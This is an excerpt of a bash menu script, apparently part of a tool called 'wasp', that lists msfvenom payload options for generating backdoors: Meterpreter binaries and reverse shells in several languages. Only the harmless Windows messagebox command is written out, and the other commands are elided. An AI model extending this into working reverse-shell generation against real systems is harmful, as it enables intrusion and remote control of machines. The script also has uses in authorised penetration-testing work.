...
do
echo
echo -e "\e[1;32m1. Payload Windows Meterpreter[$bkname.Exe] .\e[0m"
echo -e "\e[1;32m2. Payload Linux Meterpreter [$bkname.Elf] .\e[0m"
echo -e "\e[1;32m3. Payload Shell reverse Mac[$bkname.Macho] .\e[0m"
echo -e "\e[1;32m4. Payload Meterpreter ASP [$bkname.Asp] .\e[0m"
echo -e "\e[1;32m5. Payload Shell reverse JSP [$bkname.jsp] .\e[0m"
echo -e "\e[1;32m6. Payload cmd reverse Perl [$bkname.pl] .\e[0m"
echo -e "\e[1;32m7. Payload cmd reverse Python [$bkname.py] .\e[0m"
echo -e "\e[1;32m8. Payload cmd reverse Bash [$bkname.sh] .\e[0m"
echo -e "\e[1;32m9. Payload cmd reverse Php [$bkname.php].\e[0m"
echo -e "\e[1;32m10. Windows Messagebox [$bkname].\e[0m"
echo -e "\e[1;32m11. main.\e[0m"
echo -e "\e[1;32m12. Exit.\e[0m"
echo
...
case "$REPLY" in
     ...
     10) msfvenom x86 --platform windows -p windows/messagebox TEXT="Pwned!!" -f python ;;
     11) wasp ;;
     12) exit ;;
